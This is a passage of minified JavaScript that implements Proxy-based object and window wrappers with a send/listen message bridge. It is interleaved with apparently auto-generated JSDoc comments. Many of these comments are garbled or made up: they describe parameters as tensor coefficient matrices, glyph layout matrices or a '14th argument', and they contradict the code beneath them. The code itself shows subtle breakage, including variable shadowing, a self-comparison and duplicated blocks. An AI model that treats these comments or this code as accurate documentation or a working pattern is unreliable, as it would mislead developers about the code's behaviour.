                         * to determine whether the accessor function can be called to update the corresponding
                         * value in the object.
                         * 
                         * @param { number } n - value that is being assigned to the specified property of
                         * the object returned by `zn[t]`.
                         * 
                         * @returns { boolean } determined based on the value of `n`, and sets the appropriate
                         * properties of `o`.
                         */
                        set: (e,t,n)=>{
                            const o = zn[t];
                            if (o && o.set)
                                return o.set(n),
                                !0;
                            const {d} = d[t];
                            return !(d && !d.writable && !It(d, "set") || i(t) || (delete zn[t],
                            vt(d, t, n),
                            d[t] && d[t].configurable && d[t].writable && d[t].value && "function" == typeof d[t].value && !p(d[t].value) && (d[t].value = Gt(d[t].value)),
                            d[t] && !d[t].configurable && "function" == typeof d[t].get && !p(d[t].get) && (d[t].get = Gt(d[t].get)),
                            d[t] && !d[t].configurable && "function" == typeof d[t].set && !p(d[t].set) && (d[t].set = Gt(d[t].set)),
                            0))
                        }
                    }));
                    Ht(gt(f), (e=>{
                        zn[e] = zn[e] || Gt({
                            bind: !0
                        })
                    }
                    ));
                    const c = Gt({})
                      , d = Gt({});
                    Lt(d, hn, "Window");
                    const g = new Un(d,Gt({
                        /**
                         * @description generates high-quality documentation for code and modifies properties
                         * of an object based on predetermined criteria, ensuring the object's properties are
                         * correctly configured and writable, while also removing unused property references.
                         * 
                         * @param { object } e - Object value being evaluated for possible manipulation.
                         * 
                         * @param { object } t - 3rd argument of the function, which is an object that contains
                         * property names to be configured, and their corresponding values to be set or returned.
                         * 
                         * @param { .................... (type of n). } n - 2nd argument passed to the function,
                         * which is used as the key for accessing the configuration object of the same name.
                         * 
                         * 		- `d`: The enumerable property value of `n`.
                         * 		- `l`: The writable property value of `n`.
                         * 		- `s`: The configurable property value of `n`.
                         * 		- `o`: The original property object.
                         * 
                         * 	Note that if `n` is not an object, the function will throw an exception.
                         * 
                         * 
                         * @returns { boolean } a modified object with updated configuration properties.
                         */
                        defineProperty: (e,t,n)=>{
                            const {d: o, l: r} = i(t)
                              , s = Gt(n);
                            return o && !o.configurable && (!!o.configurable != !!s.configurable || !!o.enumerable != !!o.enumerable) || o && c[t] || o && o.get && !o.set ? (vt(r ? d : zn, t, s),
                            !1) : (vt(d, t, s),
                            d[t] && d[t].configurable && d[t].writable && d[t].value && "function" == typeof d[t].value && !p(d[t].value) && (d[t].value = Gt(d[t].value)),
                            d[t] && !d[t].configurable && "function" == typeof d[t].get && !p(d[t].get) && (d[t].get = Gt(d[t].get)),
                            d[t] && !d[t].configurable && "function" == typeof d[t].set && !p(d[t].set) && (d[t].set = Gt(d[t].set)),
                            delete c[t],
                            !0)
                        }
                        ,
                        /**
                         * @description removes a property from an object and recursively deletes all instances
                         * of that property within nested objects.
                         * 
                         * @param { object } e - Object that contains the property being checked for configuration.
                         * 
                         * @param { object } t - 2nd argument passed to the higher-order function, which is
                         * used to determine whether to delete an object property or not based on its value
                         * and configurability.
                         * 
                         * @returns { boolean } a boolean indicating whether the specified property should
                         * be deleted from an object.
                         */
                        deleteProperty: (e,t)=>{
                            let {d: n, l: o, w: r} = d[t];
                            return !(!n || !n.configurable) && (o && (o = delete zn[t],
                            d[t] && "function" == typeof n && r && i(t, n)),
                            (r || (n = e[t]) && n.configurable) && (delete e[t],
                            delete d[t]),
                            delete zn[t],
                            o || r)
                        }
                        ,
                        /**
                         * @description retrieves and caches a value from the given `d` object or property,
                         * optionally wrapping it in a function that returns the cached value when called.
                         * 
                         * @param { any } e - 1st argument of the `Gt()` method and is used to chain methods
                         * on an object.
                         * 
                         * @param { variable. } t - 10-letter token being searched for in the object `zn`.
                         * 
                         * 		- `zn`: An object containing the serialized input.
                         * 		- `o`: A property in the `zn` object that holds the value of `t`. If `once` is
                         * set to `true`, the `value` property is returned. Otherwise, the `get` method is
                         * called to retrieve the value.
                         * 		- `d`: An object containing the deserialized output. The `r` property is an
                         * object that may contain a `value` or `get` property. If the `value` property exists,
                         * it returns its value. If the `get` property exists, it calls the function and
                         * returns its result.
                         * 		- `e`: A variable used in the case where the `get` method is called. Its type
                         * is inferred from the input `r`.
                         * 
                         * 
                         * @returns { object } the value of the designated property or the result of calling
                         * the getter method, if present.
                         */
                        get: (e,t)=>{
                            const o = zn[t];
                            if (o) {
                                if (o.once && delete zn[t],
                                "value"in o)
                                    return o.value;
                                if (o.get)
                                    return o.get()
                            }
                            const {d: r} = d[t];
                            if (r) {
                                let e;
                                const o = "value"in r ? It(r, "value") : (e = It(r, "get")) && "function" == typeof e ? e() : void 0;
                                return o && o.once && o.bind ? Gt(o) : o
                            }
                        }
                        ,
                        /**
                         * @description sets the enumerable, configurable, and writable properties of a given
                         * property on an object based on the corresponding property in a supplied array. If
                         * the property does not exist on the object, it creates a new property with the
                         * specified values.
                         * 
                         * @param { object } e - Object Prototype of the object to be created, which is used
                         * to define the `__proto__` property of the newly created object.
                         * 
                         * @param { object } t - object to be assigned to the enumerable property of the
                         * global namespace object, `zn`, in the function.
                         * 
                         * @returns { object } an object containing the property descriptor information for
                         * the specified object and name.
                         */
                        getOwnPropertyDescriptor: (e,t)=>{
                            let {d: o, l: r} = d[t];
                            if (!o) {
                                const e = zn[t];
                                if (e)
                                    return Gt({
                                        enumerable: !0,
                                        configurable: !0,
                                        writable: !0,
                                        value: e.value,
                                        set: e.set,
                                        get: e.get
                                    });
                                if (!i(t))
                                    return;
                                o = Nt(zn, t),
                                r = !1
                            }
                            const i = Gt({});
                            if (!r) {
                                const e = i.get;
                                e && (i.get = ()=>{
                                    const t = e();
                                    return "function" == typeof t && (t.__proto__ = zn),
                                    Gt(t)
                                }
                                ),
                                i && !i.configurable && vt(d, t, i)
                            }
                            return i
                        }
                        ,
                        has: (e,t)=>t in zn || t in d,
                        /**
                         * @description takes an object `c`, returns a new array `o` of length `Object.keys(c).length`,
                         * and assigns a boolean value to each index in `o`, where `o[i]` is `true` if the
                         * corresponding key `k` in `c` does not appear in the output, and `o[i]` is `false`
                         * otherwise.
                         * 
                         * @returns { array } an array of unique object keys.
                         */
                        ownKeys: ()=>{
                            const e = e=>!(e in c)
                              , t = gt(c)
                              , n = Ft(gt(ht(zn)), e)
                              , o = Gt({});
                            for (let e = 0; "Window" === Zt(Ot(d, e)); e += 1)
                                o[e] = !0;
                            const s = Ft(gt(o), e);
                            return qt(t, n, s)
                        }
                        ,
                        preventExtensions: ()=>!0,
                        /**
                         * @description sets a property on an object and returns whether it was successful
                         * or not. If the property does not exist, it creates it with configurable, writable,
                         * and value properties set to their default values.
                         * 
                         * @param { number } e - object that is being manipulated and accessed through the
                         * function, serving as a reference for the various actions performed within the function.
                         * 
                         * @param { undeclared variable (not initialized) } t - variable name for which the
                         * setter and getter functions will be generated, and it is used to determine the
                         * corresponding configuration data within the `zn` object.
                         * 
                         * 		- `o`: The deserialized output from the `zn` object. If `o` is present and has
                         * a `set` method, then it will be returned after being modified.
                         * 		- `d`: The deserialized object from the `d` array. If `d` is present, its
                         * properties are described below:
                         * 		+ `writable`: A boolean indicating whether the value of the property can be modified.
                         * 		+ `configurable`: A boolean indicating whether the property can be configured
                         * or not.
                         * 		+ `value`: The initial value of the property, which may be a function.
                         * 		+ `get`: A function that returns the value of the property, or undefined if the
                         * property is not readable.
                         * 		+ `set`: A function that sets the value of the property, or undefined if the
                         * property is not writable.
                         * 		+ `p`: A boolean indicating whether the property is partially applied (i.e., its
                         * value is a function).
                         * 
                         * 	If any of these properties are present and have values, then the function will
                         * return `!0` after modifying the input `t`. Otherwise, it will return `0`.
                         * 
                         * 
                         * @param { object } n - new value that is being set for the corresponding property
                         * of the object, and its presence determines whether the assignment is allowed or not.
                         * 
                         * @returns { boolean } true if the property set successfully, otherwise false.
                         */
                        set: (e,t,n)=>{
                            const o = zn[t];
                            if (o && o.set)
                                return o.set(n),
                                !0;
                            const {d} = d[t];
                            return !(d && !d.writable && !It(d, "set") || i(t) || (delete zn[t],
                            vt(d, t, n),
                            d[t] && d[t].configurable && d[t].writable && d[t].value && "function" == typeof d[t].value && !p(d[t].value) && (d[t].value = Gt(d[t].value)),
                            d[t] && !d[t].configurable && "function" == typeof d[t].get && !p(d[t].get) && (d[t].get = Gt(d[t].get)),
                            d[t] && !d[t].configurable && "function" == typeof d[t].set && !p(d[t].set) && (d[t].set = Gt(d[t].set)),
                            0))
                        }
                    }));
                    return g
                }
                )({
                    sendPrefix: r.sendPrefix,
                    listenPrefix: r.listenPrefix
                });
                let p = null;
                /**
                 * @description sets up an RPC listener on `n` and returns an object with four methods:
                 * `send`, `once`, `setMessageListener`, and `cleanup`.
                 * 
                 * @param { object } t - 3rd party messaging server that the function is called on,
                 * and it is used to store the server's response to the function's callbacks.
                 * 
                 * @param { object } n - EventListener of the observable, which is used to subscribe
                 * to the observable's notifications and trigger actions when they arrive.
                 * 
                 * @returns { object } an object that implements four methods for sending and listening
                 * to messages on a channel.
                 */
                const h = ((t,n)=>{
                    const o = Gt({});
                    Ht(gt(n), (t=>{
                        vt(o, t, Gt(e[t]))
                    }
                    ));
                    const r = {
                        /**
                         * @description is used to send a message to a websocket endpoint. It takes an error,
                         * message, and a reference to an options object as parameters, and returns nothing.
                         * 
                         * @param { number } e - 2D matrix of coefficients for the given tensor expression.
                         * 
                         * @param { object } t - 2D transformation matrix for the glyph layout update in the
                         * given code snippet.
                         */
                        send: (e,t)=>{
                            const s = Gt({
                                m: e,
                                a: t,
                                r: null
                            });
                            o.send(n.sendPrefix, s)
                        }
                        ,
                        /**
                         * @description is called with an event object `e` and a callback function `n`. When
                         * `n` is called, it adds a listener for `e` to the observer `o`.
                         * 
                         * @param { event. } e - event that triggers the listener to be added.
                         * 
                         * 		- `e`: This is the object being passed to the `once` function. It has an
                         * `listenPrefix` property that is bound to a function.
                         * 
                         * 
                         * @param { Event. } t - event object and is used to call the `once` method on it,
                         * thereby registering an event listener.
                         * 
                         * 	1/ `once`: This property indicates that the event listener will be added only
                         * once to the specified element.
                         * 	2/ `e`: This property refers to the event that will trigger the listeners added
                         * by the `once` function.
                         * 	3/ `n`: This property is the target element for which the event listeners are
                         * being added. It has a `listenPrefix` attribute, which contains the prefix of the
                         * event name.
                         * 	4/ `o`: This property is the object that holds the event listeners and other
                         * event-related information.
                         */
                        once: (e,t)=>{
                            o.once(n.listenPrefix, (n=>{
                                t.once(e, n)
                            }
                            ))
                        }
                        ,
                        setMessageListener: e=>{
                            o.setMessageListener((t=>{
                                const o = t.m
                                  , r = t.a;
                                "ack" === o ? e(null, r) : e({
                                    method: o,
                                    args: r
                                })
                            }
                            ))
                        }
                        ,
                        /**
                         * @description and the `p()` function are executed sequentially in this function,
                         * where `o.cleanup()` performs some cleanup operations before `p()` is called if it
                         * is not `undefined`.
                         */
                        cleanup: ()=>{
                            o.cleanup(),
                            p && p()
                        }
                    };
                    return r
                }
                )({
                    sendPrefix: t.sendPrefix,
                    listenPrefix: t.listenPrefix
                }, a);
                const m = {
                    /**
                     * @description dispatches an event to its target with the provided event and target
                     * arguments.
                     * 
                     * @param { HTMLButtonElement. } e - event that triggered the function.
                     * 
                     * 		- `e`: The deserialized input contains a payload of type `t`.
                     * 
                     * 
                     * @param { number } t - error message to be sent by the function.
                     */
                    send: (e,t)=>{
                        h.send(e, t)
                    }
                    ,
                    /**
                     * @description triggers an event or emits a signal only once when it is called, even
                     * if it is called multiple times.
                     * 
                     * @param { 𝓺 (Event). } e - event to which the function's callback is attached.
                     * 
                     * 		- `e`: A generic event object passed to the `once` function for further processing
                     * or action.
                     * 		- `t`: The target element associated with the event.
                     * 
                     * 
                     * @param { HTMLElement (HTMLElement). } t - 2nd event listener to be added to the
                     * `h` object.
                     * 
                     * 		- `e`: The event that triggered the function. (Type: Event)
                     * 		- `t`: The deserialized input, which may have been passed through various
                     * transformation functions before being processed by the `once` function. (Type: Any)
                     */
                    once: (e,t)=>{
                        h.once(e, t)
                    }
                    ,
                    setMessageListener: e=>{
                        h.setMessageListener(e)
                    }
                    ,
                    /**
                     * @description is used to perform any necessary cleanup tasks, such as releasing
                     * resources or setting state variables to a known value before they are no longer needed.
                     */
                    cleanup: ()=>{
                        h.cleanup()
                    }
                };
                return m
            }
            )((e=>{
                const t = {};
                return e.send && (t.send = e.send),
                e.once && (t.once = e.once),
                e.setMessageListener && (t.setMessageListener = e.setMessageListener),
                t
            }
            )(a)),
            r.bridges.third = a,
            {
                createProxy: e=>{
                    let t = r;
                    /**
                     * @description removes event listeners from an object and sets a value to `null`.
                     * The `d` function removes an event listener when its value is set to `null`, otherwise
                     * it sets that value to a new function that calls the original function with any
                     * arguments passed.
                     * 
                     * @param { expression or statement. } e - 2nd argument passed to the `mn()` function,
                     * which is used to create a new unique ID for the element being processed.
                     * 
                     * 		- `mn(e, 2)` returns the second method on the object `e`.
                     * 		- `d[n]` is a property on the global scope `t`.
                     * 		- `if` evaluates to `true` if the expression inside the condition is truthy, and
                     * `false` otherwise.
                     * 		- `t.removeEventListener(n, i)` removes an event listener for the event named
                     * `n` on the object `t`, with the handler function `i`.
                     * 		- `delete d[n]` deletes the property `n` from the global scope `d`.
                     * 		- `if` evaluates to `true` if the expression inside the condition is truthy, and
                     * `false` otherwise.
                     * 		- `const e = (...e)=>Rt(t, s, e)` creates a new function that calls `Rt` with
                     * `t`, `s`, and the deserialized input `e` as arguments.
                     * 		- `t.addEventListener(n, e)` adds an event listener for the event named `n` on
                     * the object `t`, with the handler function `e`.
                     * 
                     * 
                     * @param { HTMLInputElement in line 5 of the code snippet provided. } t - 2nd argument
                     * passed to the function, which is an Event target object that provides the context
                     * for attaching and removing event listeners.
                     * 
                     * 		- `removeEventListener()`: This is a method of the `t` object that removes an
                     * event listener for the specified event name.
                     * 		- `addEventListener()`: This is another method of the `t` object that adds an
                     * event listener for the specified event name.
                     * 		- `delete d[n]`: This line of code deletes the property `n` from the `d` object.
                     * 		- `(e=>"function" == typeof e)(t)`: This line checks whether `t` is a function
                     * by checking its `typeof` value. If it's a function, then do something with it. The
                     * `e` variable is unused in this code snippet.
                     * 		- `const e = (...e)=>Rt(t, s, e)`: This line creates a new function that calls
                     * the `Rt()` function with the deserialized input `t`, a second argument `s`, and
                     * an optional argument `e`. The function takes any number of arguments and returns
                     * its result.
                     * 		- `t.addEventListener(n, e)`: This line adds an event listener to the `t` object
                     * for the event named `n`.
                     * 		- `d[n] = e`: This line sets the value of the property `n` in the `d` object to
                     * the newly created function `e`.
                     */
                    const n = e=>{
                        let o, n;
                        const r = (o = Nt(t, e)) || (n = Nt(s, e));
                        return Gt({
                            d: r,
                            l: !!o,
                            w: !!n
                        })
                    }
                      , o = e=>{
                        if (!l(e))
                            return !1;
                        if ("length" === e)
                            return !0;
                        const t = wt($n(e));
                        return t >= 0 && t <= rn && e === `${t}`
                    }
                      , r = e=>"on" === mn(e, 0, 2)
                      , i = (e,t)=>{
                        const n = mn(e, 2)
                          , i = d[n];
                        if (i && (t.removeEventListener(n, i),
                        delete d[n]),
                        t && (e=>"function" == typeof e)(t)) {
                            const e = (...e)=>Rt(t, s, e);
                            t.addEventListener(n, e),
                            d[n] = e
                        }
                    }
                      , s = Gt({})
                      , a = Gt({})
                      , u = new Un(a,Gt({
                        /**
                         * @description sets or deletes a property on an object, taking into account its
                         * configurable and enumerable values, as well as the value itself. It also provides
                         * a mechanism for defining getters and setters for the property.
                         * 
                         * @param { object } e - Object being processed, which is used to access properties
                         * of that object and perform operations on it within the function.
                         * 
                         * @param { ............................... (you choose). } t - object to be mutated
                         * or deleted, and is used in various conditions to determine the action to be taken
                         * on the object.
                         * 
                         * 		- `d`: The value of `d` is the deserialed output from the `get` or `set` method,
                         * depending on whether it is a getter or a setter.
                         * 		- `l`: The value of `l` is a boolean indicating whether the property is enumerable
                         * or not.
                         * 		- `o`: The object `o` represents the properties and methods of an object, which
                         * can have various attributes such as `configurable`, `enumerable`, `value`, `get`,
                         * and `set`.
                         * 		- `s`: The object `s` is created by calling the `get` or `set` method of the
                         * object `n` if applicable.
                         * 		- `a`: The variable `a` stores the original input object, which may have properties
                         * that need to be modified through the `defineProperty` function.
                         * 		- `r`: The variable `r` represents a boolean indicating whether the property is
                         * writable or not.
                         * 
                         * 	The function performs several operations on the properties of `t`, such as assigning
                         * values to them based on their type, making them enumerable if necessary, and
                         * deleting them if appropriate.
                         * 
                         * 
                         * @param { object } n - Object being mutated, providing both the object and its
                         * enumerable property names for mutation detection and handling.
                         * 
                         * @returns { unspecified primitive value (a single, unique, atomic value). } a new
                         * object with the desired properties and values.
                         * 
                         * 		- `o`: The original object.
                         * 		- `n`: The new property descriptor.
                         * 		- `t`: The property name.
                         * 		- `r`: The property value (if present).
                         * 		- `s`: The storage location of the property value (either in the object or in a
                         * separate store called `a`).
                         * 		- `d`: A boolean indicating whether the property is configurable (`true`) or not
                         * (`false`).
                         * 		- `l`: A boolean indicating whether the property is enumerable (`true`) or not
                         * (`false`).
                         * 
                         * 	If `o` and `n` are present, then the `defineProperty` function has been called
                         * on an object and a new property descriptor was generated. Otherwise, the function
                         * was called without an object as the first argument. The `t` parameter represents
                         * the name of the property, while `r` represents the value of the property (if it
                         * was provided). The `s` parameter indicates whether the property value is stored
                         * in the object itself or in a separate store called `a`.
                         * 
                         * 	The `d` and `l` parameters provide additional information about the property. `d`
                         * indicates whether the property is configurable (`true`) or not (`false`), while
                         * `l` indicates whether the property is enumerable (`true`) or not (`false`). These
                         * attributes can be used to customize the behavior of the `defineProperty` function
                         * and the resulting property descriptor.
                         */
                        defineProperty: (e,t,n)=>{
                            const {d: o, l: r} = n(t)
                              , s = Gt(n);
                            return o && !o.configurable && (!!o.configurable != !!s.configurable || !!o.enumerable != !!o.enumerable) || o && a[t] || o && o.get && !o.set ? (vt(r ? a : s, t, s),
                            !1) : (vt(a, t, s),
                            a[t] && a[t].configurable && a[t].writable && a[t].value && "function" == typeof a[t].value && !p(a[t].value) && (a[t].value = Gt(a[t].value)),
                            a[t] && !a[t].configurable && "function" == typeof a[t].get && !p(a[t].get) && (a[t].get = Gt(a[t].get)),
                            a[t] && !a[t].configurable && "function" == typeof a[t].set && !p(a[t].set) && (a[t].set = Gt(a[t].set)),
                            delete u[t],
                            !0)
                        }
                        ,
                        /**
                         * @description checks if an property exists in an object, and if so, deletes it and
                         * related properties from the object and the nested array `s`. If the property is
                         * not found, the function does nothing.
                         * 
                         * @param { object } e - environment object used to access the property `a`.
                         * 
                         * @param { object } t - 4-item array `a` or the object `e` being manipulated, which
                         * determines whether to perform updates on the objects or not.
                         * 
                         * @returns { boolean } whether or not a property exists and can be deleted from an
                         * object.
                         */
                        deleteProperty: (e,t)=>{
                            let {d: n, l: o, w: r} = a[t];
                            return !(!n || !n.configurable) && (o && (o = delete s[t],
                            a[t] && "function" == typeof n && r && i(t, n)),
                            (r || (n = e[t]) && n.configurable) && (delete e[t],
                            delete a[t]),
                            delete s[t],
                            o || r)
                        }
                        ,
                        /**
                         * @description returns a value or an observable if it exists in the object or array
                         * at the specified index, optionally binding the function to prevent future changes
                         * and removing it from the array upon return.
                         * 
                         * @param { integer } e - 1:1 relationship between the outer function's `a` array
                         * index and the inner function's `t` variable.
                         * 
                         * @param { string } t - 0-based index of an object property to access or delete
                         * within an array of objects.
                         * 
                         * @returns { `oid`. } the value of the specified property or method of the object,
                         * if it exists.
                         * 
                         * 		- `if (o.once && delete s[t])`: If `o` is an object with the property `once` set
                         * to `true`, and if deleting the property from `s` array, the function returns the
                         * value of the object.
                         * 		- `if (o.get)`: If the object has a `get` property, the function returns the
                         * result of calling the `get` property.
                         * 		- `const {d: r} = a[t];`: If the array `a[t]` contains an object with a property
                         * called `d`, the function assigns the value of `r` to a new constant.
                         * 		- `let e;`: A new variable `e` is declared and assigned the result of calling
                         * the `It` function with the value of `r`.
                         * 		- `const o = "value"in r ? It(r, "value") : (e = It(r, "get")) && "function" ==
                         * typeof e ? e() : void 0;`: If the object `r` has a property called `value`, the
                         * function returns the result of calling the `It` function with the value of `r`.
                         * Otherwise, it calls the `get` property and assigns the result to a new constant.
                         * 		- `return o && o.once && o.bind ? Gt(o) : o`: If the returned object `o` has the
                         * properties `once` and `bind`, the function returns the value of `Gt(o)`. Otherwise,
                         * it returns the value of `o`.
                         */
                        get: (e,t)=>{
                            const o = s[t];
                            if (o) {
                                if (o.once && delete s[t],
                                "value"in o)
                                    return o.value;
                                if (o.get)
                                    return o.get()
                            }
                            const {d: r} = a[t];
                            if (r) {
                                let e;
                                const o = "value"in r ? It(r, "value") : (e = It(r, "get")) && "function" == typeof e ? e() : void 0;
                                return o && o.once && o.bind ? Gt(o) : o
                            }
                        }
                        ,
                        /**
                         * @description 1. Checks if the specified property exists in an object. If it does,
                         * returns an object with properties enumerable: true, configurable: true, writable:
                         * true, value, set, and get (if available).
                         * 
                         * @param { object } e - gets property of an object.
                         * 
                         * @param { object } t - 14th argument passed to the function, which is used to access
                         * the properties of an object within the function's scope.
                         * 
                         * @returns { object } an object containing the property descriptor of the specified
                         * key on the provided object.
                         */
                        getOwnPropertyDescriptor: (e,t)=>{
                            let {d: o, l: r} = a[t];
                            if (!o) {
                                const e = s[t];
                                if (e)
                                    return Gt({
                                        enumerable: !0,
                                        configurable: !0,
                                        writable: !0,
                                        value: e.value,
                                        set: e.set,
                                        get: e.get
                                    });
                                if (!u(t))
                                    return;
                                o = Nt(s, t),
                                r = !1
                            }
                            const i = Gt({});
                            if (!r) {
                                const e = i.get;
                                e && (i.get = ()=>{
                                    const t = e();
                                    return "function" == typeof t && (t.__proto__ = s),
                                    Gt(t)
                                }
                                ),
                                i && !i.configurable && vt(a, t, i)
                            }
                            return i
                        }
                        ,
                        has: (e,t)=>t in s || t in a,
                        /**
                         * @description iterates through an object's own enumerable property keys and returns
                         * an array of those keys.
                         * 
                         * @returns { array } an array of unique strings, each representing a key in the
                         * object's properties.
                         */
                        ownKeys: ()=>{
                            const e = e=>!(e in c)
                              , t = gt(c)
                              , n = Ft(gt(ht(s)), e)
                              , o = Gt({});
                            for (let e = 0; "Window" === Zt(Ot(a, e)); e += 1)
                                o[e] = !0;
                            const s = Ft(gt(o), e);
                            return qt(t, n, s)
                        }
                        ,
                        preventExtensions: ()=>!0,
                        /**
                         * @description sets the value of an object property if it's writable and has a `set`
                         * method, otherwise returns false.
                         * 
                         * @param { expression. } e - 3rd argument passed to the function, which is an object
                         * that provides additional configuration options for the setter and getter methods.
                         * 
                         * 		- `s`: an object with property `t`, which is a string representing the name of
                         * a configuration option.
                         * 		- `a`: an object with property `t`, which is a reference to the original
                         * configuration object.
                         * 		- `o`: a property of `s` containing a serialized object value, which is the
                         * current value of the configuration option being updated.
                         * 		- `d`: a property of `a` containing a configuration option value, which is used
                         * for updating the original configuration object.
                         * 		- `u`: a function that is called when an invalid value is attempted to be set
                         * on a writable property, which returns a Boolean indicating whether the operation
                         * was successful.
                         * 		- `p`: a function that checks if the value of a property is a valid serialized
                         * value, which is used to ensure that only valid values are set on the configuration
                         * object.
                         * 		- `Gt`: a function that converts an existing value to a valid serialized value,
                         * which is used to update the value of a property when it is read from or written to.
                         * 
                         * 
                         * @param { string } t - name of a property in an object `s` or `a`, and it is used
                         * to determine if the property exists and if its value can be modified through the
                         * `set` method.
                         * 
                         * @param { number } n - new value that is being assigned to the property of an object
                         * through the function.
                         * 
                         * @returns { any } a boolean value indicating whether the property was successfully
                         * set.
                         */
                        set: (e,t,n)=>{
                            const o = s[t];
                            if (o && o.set)
                                return o.set(n),
                                !0;
                            const {d} = a[t];
                            return !(d && !d.writable && !It(d, "set") || u(t) || (delete s[t],
                            vt(a, t, n),
                            a[t] && a[t].configurable && a[t].writable && a[t].value && "function" == typeof a[t].value && !p(a[t].value) && (a[t].value = Gt(a[t].value)),
                            a[t] && !a[t].configurable && "function" == typeof a[t].get && !p(a[t].get) && (a[t].get = Gt(a[t].get)),
                            a[t] && !a[t].configurable && "function" == typeof a[t].set && !p(a[t].set) && (a[t].set = Gt(a[t].set)),
                            0))
                        }
                    }));
                    Ht(gt(u), (e=>{
                        s[e] = s[e] || Gt({
                            bind: !0
                        })
                    }
                    ));
                    const c = Gt({})
                      , d = Gt({});
                    Lt(d, hn, "Window");
                    const g = new Un(d,Gt({
                        /**
                         * @description generates high-quality documentation for code that is given to it and
                         * returns whether a property exists on an object, as well as whether its value can
                         * be modified or not
                         * 
                         * @param { object } e - ether variable.
                         * 
                         * @param { object } t - name of an object property being tested for configuration
                         * and writability.
                         * 
                         * @param { HTMl property name. } n - 2nd argument of the function, which is the
                         * target object for configuration and enumeration.
                         * 
                         * 		- `d`: The original property descriptor.
                         * 		- `l`: The property value or the value of the corresponding property on the
                         * object being serialized (i.e., `o`).
                         * 		- `s`: The Serialized form of the property value, which is used to compare with
                         * the deserialized input `n`.
                         * 
                         * 	The function returns a boolean value indicating whether the property was successfully
                         * created or modified, or whether it already existed and its attributes were modified.
                         * 
                         * 
                         * @returns { object } a modified object with set, get, and configurable properties
                         * according to specified values.
                         */
                        defineProperty: (e,t,n)=>{
                            const {d: o, l: r} = i(t)
                              , s = Gt(n);
                            return o && !o.configurable && (!!o.configurable != !!s.configurable || !!o.enumerable != !!o.enumerable) || o && c[t] || o && o.get && !o.set ? (vt(r ? d : zn, t, s),
                            !1) : (vt(d, t, s),
                            d[t] && d[t].configurable && d[t].writable && d[t].value && "function" == typeof d[t].value && !p(d[t].value) && (d[t].value = Gt(d[t].value)),
                            d[t] && !d[t].configurable && "function" == typeof d[t].get && !p(d[t].get) && (d[t].get = Gt(d[t].get)),
                            d[t] && !d[t].configurable && "function" == typeof d[t].set && !p(d[t].set) && (d[t].set = Gt(d[t].set)),
                            delete c[t],
                            !0)
                        }
                        ,
                        /**
                         * @description tests whether a property should be deleted from an object or not based
                         * on certain conditions. It checks if the property is configurable, not null or
                         * undefined, and if it exists in the original object or the function scope. If all
                         * conditions are met, the function deletes the property from both the original object
                         * and a cache named `zn`.
                         * 
                         * @param { object } e - execution context and is used to determine if a property can
                         * be deleted based on whether it exists in the context and is configurable.
                         * 
                         * @param { array } t - 3rd variable to check for deletion along with its nested
                         * values in the object `d`.
                         * 
                         * @returns { boolean } true if the property exists and is either a primitive or
                         * configurable, false otherwise.
                         */
                        deleteProperty: (e,t)=>{
                            let {d: n, l: o, w: r} = d[t];
                            return !(!n || !n.configurable) && (o && (o = delete zn[t],
                            d[t] && "function" == typeof n && r && i(t, n)),
                            (r || (n = e[t]) && n.configurable) && (delete e[t],
                            delete d[t]),
                            delete zn[t],
                            o || r)
                        }
                        ,
                        /**
                         * @description retrieves a value or calls a getter method associated with an object
                         * property `t`. If the object is observable (i.e., has `once` and `bind` properties),
                         * it returns the bound value, else it returns the unbound value.
                         * 
                         * @param { any } e - 4th argument passed to the function, which is used as the return
                         * value if the value or get method of the object are accessible and not undefined
                         * or null.
                         * 
                         * @param { object } t - 2nd level of the nested object being traversed and is used
                         * to access the properties or methods of that level within the function.
                         * 
                         * @returns { object } a value or an object with a `value` property, bound to a
                         * specified context.
                         */
                        get: (e,t)=>{
                            const o = zn[t];
                            if (o) {
                                if (o.once && delete zn[t],
                                "value"in o)
                                    return o.value;
                                if (o.get)
                                    return o.get()
                            }
                            const {d: r} = d[t];
                            if (r) {
                                let e;
                                const o = "value"in r ? It(r, "value") : (e = It(r, "get")) && "function" == typeof e ? e() : void 0;
                                return o && o.once && o.bind ? Gt(o) : o
                            }
                        }
                        ,
                        /**
                         * @description returns an object containing the value, setter, and getter functions
                         * for a specified property on an object. It also updates the prototype chain if necessary.
                         * 
                         * @param { object } e - property descriptor object for the specified property `t`
                         * of the target object `d`.
                         * 
                         * @param { object } t - property being enumerated and its value is used to set the
                         * value of the property on the object returned by the function.
                         * 
                         * @returns { object } an object that represents the property descriptors of a given
                         * object.
                         */
                        getOwnPropertyDescriptor: (e,t)=>{
                            let {d: o, l: r} = d[t];
                            if (!o) {
                                const e = zn[t];
                                if (e)
                                    return Gt({
                                        enumerable: !0,
                                        configurable: !0,
                                        writable: !0,
                                        value: e.value,
                                        set: e.set,
                                        get: e.get
                                    });
                                if (!i(t))
                                    return;
                                o = Nt(zn, t),
                                r = !1
                            }
                            const i = Gt({});
                            if (!r) {
                                const e = i.get;
                                e && (i.get = ()=>{
                                    const t = e();
                                    return "function" == typeof t && (t.__proto__ = zn),
                                    Gt(t)
                                }
                                ),
                                i && !i.configurable && vt(d, t, i)
                            }
                            return i
                        }
                        ,
                        has: (e,t)=>t in zn || t in d,
                        /**
                         * @description takes an object `c` and returns an array of unique keys (`e`) present
                         * in `c`. The function first filters out any duplicate keys, then recursively calls
                         * itself on the rest of the objects properties until a unique set of keys is obtained.
                         * Finally, it returns the set of unique keys as an array.
                         * 
                         * @returns { array } an array of unique strings, where each string represents a
                         * property key that exists in the given object.
                         */
                        ownKeys: ()=>{
                            const e = e=>!(e in c)
                              , t = gt(c)
                              , n = Ft(gt(ht(zn)), e)
                              , o = Gt({});
                            for (let e = 0; "Window" === Zt(Ot(d, e)); e += 1)
                                o[e] = !0;
                            const s = Ft(gt(o), e);
                            return qt(t, n, s)
                        }
                        ,
                        preventExtensions: ()=>!0,
                        /**
                         * @description sets a value on an object, checking for writability and configurability
                         * of the object, and using the get and set functions to ensure proper behavior.
                         * 
                         * @param { number } e - property being modified.
                         * 
                         * @param { ................ (answer: "undefined"). } t - token in which the properties
                         * are being checked, and is used to determine whether the property can be set or not.
                         * 
                         * 		- `o`: The value of the `o` property is the result of calling the `set` method
                         * on the deserialized object.
                         * 		- `d`: The value of the `d` property is a plain object that contains the
                         * deserialized value of the input.
                         * 		- `n`: The value of the `n` property is the name of the property being set.
                         * 		- `It(d, "set")`: This property is set to `true` if the `set` method is not
                         * callable on the object, and `false` otherwise.
                         * 		- `i(t)`: This property is set to `true` if the input object is not immutable,
                         * and `false` otherwise.
                         * 		- `v(t)`: This property is set to `true` if the input object is a valid value,
